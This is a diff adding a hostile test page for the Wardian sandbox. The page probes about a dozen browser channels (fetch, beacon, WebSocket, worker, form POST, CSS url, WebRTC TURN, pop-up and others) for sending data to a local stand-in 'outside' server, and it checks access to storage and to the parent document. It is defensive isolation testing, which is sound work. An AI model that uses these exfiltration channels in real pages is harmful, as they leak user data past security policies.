@@ -1,0 +1,102 @@
+<!doctype html>
+<html lang="en">
+<meta charset="utf-8">
+<title>Rogue page</title>
+<!-- A hostile page app (ADR-2610081003). Opened as index.html?outside=http://127.0.0.1:PORT, it
+     tries every way to send a request to that "outside" server, to Wardian's API and to another
+     package, and writes what happened into #results as JSON. The test also counts the requests the
+     outside server receives: the page's own report could be wrong, the server's count cannot. -->
+<script src="/sdk/wardian.js"></script>
+<pre id="results">running</pre>
+<script>
+// ?open=1 tries the routes a policy cannot close (the security page lists them): WebRTC to a TURN
+// server, a pop-up, and navigating this frame away. The test proves they are still open, so the
+// docs never claim more, or less, than the browser does.
+const params = new URLSearchParams(location.search);
+// ADR-2610081003 / security.md: a page app has no cookies, no storage and no reach into the page
+// around it. Each probe is 'blocked' if it throws or reads nothing back.
+async function storageProbes(out) {
+  const tryIt = async (name, fn) => { try { out[name] = (await fn()) || 'reached'; } catch (e) { out[name] = 'blocked (' + e.name + ')'; } };
+  await tryIt('cookie', () => { document.cookie = 'w=1'; return document.cookie.includes('w=1') ? 'reached' : 'blocked (not kept)'; });
+  await tryIt('localStorage', () => { localStorage.setItem('w', '1'); return localStorage.getItem('w') === '1' ? 'reached' : 'blocked (not kept)'; });
+  await tryIt('sessionStorage', () => { sessionStorage.setItem('w', '1'); return sessionStorage.getItem('w') === '1' ? 'reached' : 'blocked (not kept)'; });
+  await tryIt('indexedDB', () => new Promise((ok, no) => { const r = indexedDB.open('w'); r.onsuccess = () => ok('reached'); r.onerror = () => no(r.error); }));
+  await tryIt('parent.document', () => parent === window ? 'top (no parent)' : typeof parent.document.body && 'reached');
+}
+if (!params.get('outside') && params.get('open') !== '1') (async () => {
+  // Opened from Wardian's app list, inside its frame: only the storage probes.
+  const out = {};
+  await storageProbes(out);
+  document.getElementById('results').textContent = JSON.stringify(out, null, 1);
+  document.title = 'done';
+})();
+else if (params.get('open') === '1') {
+  const outside = params.get('outside');
+  const turn = `turn:${new URL(outside).host}?transport=tcp`;
+  const pc = new RTCPeerConnection({ iceServers: [{ urls: turn, username: 'u', credential: 'p' }] });
+  pc.createDataChannel('x');
+  pc.createOffer().then(o => pc.setLocalDescription(o));
+  document.addEventListener('click', () => window.open(outside + '/popup'), { once: true });
+  window.leave = () => { location.href = outside + '/navigate'; };
+  document.title = 'open routes ready';
+} else (async () => {
+  const outside = params.get('outside');
+  const out = {};
+  const wait = ms => new Promise(r => setTimeout(r, ms));
+  // A probe resolves to 'reached' if the request got an answer, else 'blocked'.
+  const probe = async (name, fn) => {
+    try { out[name] = (await Promise.race([fn(), wait(2500).then(() => 'blocked (timeout)')])) || 'reached'; }
+    catch (e) { out[name] = 'blocked'; }
+  };
+  const loads = (el, attr, url) => new Promise((ok, no) => {
+    el.onload = () => ok('reached'); el.onerror = () => no(new Error('error'));
+    el[attr] = url; document.body.append(el);
+  });
+
+  // What a page must still be able to do.
+  await probe('own fetch', async () => (await (await fetch('./data.txt')).text()).trim() === 'own file' ? 'reached' : 'wrong');
+  await probe('own wasm', async () => { await WebAssembly.instantiateStreaming(fetch('./app.wasm')); return 'reached'; });
+  out['sdk loaded'] = typeof window.wardian === 'object' && typeof window.wardian.channel === 'function' ? 'reached' : 'blocked';
+  out['progress element'] = customElements.get('wardian-progress') ? 'reached' : 'blocked';
+
+  // Wardian itself, outside this package.
+  await probe('api fetch', async () => { const r = await fetch('/api/status'); await r.text(); return 'reached'; });
+  await probe('other package', async () => { const r = await fetch('/apps/adder/app.wasm'); await r.arrayBuffer(); return 'reached'; });
+
+  // The outside server, every way a page can ask.
+  await probe('outside fetch', async () => { await fetch(outside + '/fetch', { mode: 'no-cors' }); return 'reached'; });
+  await probe('outside xhr', () => new Promise((ok, no) => { const x = new XMLHttpRequest(); x.open('GET', outside + '/xhr'); x.onload = () => ok('reached'); x.onerror = no; x.send(); }));
+  await probe('outside image', () => loads(new Image(), 'src', outside + '/img'));
+  await probe('outside script', () => loads(document.createElement('script'), 'src', outside + '/script'));
+  await probe('outside style', () => { const l = document.createElement('link'); l.rel = 'stylesheet'; return loads(l, 'href', outside + '/style'); });
+  // A blocked frame still fires load, and sendBeacon says true once it has queued the request, so
+  // the page cannot tell for these: only the outside server's count can.
+  await probe('outside iframe', async () => { const f = document.createElement('iframe'); f.src = outside + '/iframe'; document.body.append(f); await wait(800); return 'unknown'; });
+  await probe('outside websocket', () => new Promise((ok, no) => { const w = new WebSocket(outside.replace('http', 'ws') + '/ws'); w.onopen = () => ok('reached'); w.onerror = no; }));
+  await probe('outside eventsource', () => new Promise((ok, no) => { const s = new EventSource(outside + '/sse'); s.onopen = () => ok('reached'); s.onerror = () => { s.close(); no(new Error('error')); }; }));
+  await probe('outside beacon', async () => { navigator.sendBeacon(outside + '/beacon', 'secret'); return 'unknown'; });
+  await probe('outside worker fetch', () => new Promise((ok, no) => {
+    const code = `fetch(${JSON.stringify(outside + '/worker')}, {mode: 'no-cors'}).then(() => postMessage('reached'), () => postMessage('blocked'))`;
+    try { const w = new Worker(URL.createObjectURL(new Blob([code], { type: 'text/javascript' }))); w.onmessage = e => e.data === 'reached' ? ok('reached') : no(new Error('blocked')); w.onerror = no; }
+    catch (e) { no(e); }
+  }));
+  await probe('outside css url', async () => {
+    const s = document.createElement('style'); s.textContent = `body { background-image: url(${outside}/cssurl); }`;
+    document.head.append(s); await wait(800); return 'unknown';
+  });
+  await probe('outside form', async () => {
+    const sink = document.createElement('iframe'); sink.name = 'sink'; document.body.append(sink);
+    const f = document.createElement('form'); f.method = 'post'; f.action = outside + '/form'; f.target = 'sink';
+    f.innerHTML = '<input name="secret" value="1">'; document.body.append(f); f.submit(); await wait(800); return 'unknown';
+  });
+  await probe('outside prefetch', async () => {
+    const l = document.createElement('link'); l.rel = 'prefetch'; l.href = outside + '/prefetch'; document.head.append(l); await wait(800); return 'unknown';
+  });
+
+  await storageProbes(out);
+
+  document.getElementById('results').textContent = JSON.stringify(out, null, 1);
+  document.title = 'done';
+})();
+</script>
+</html>
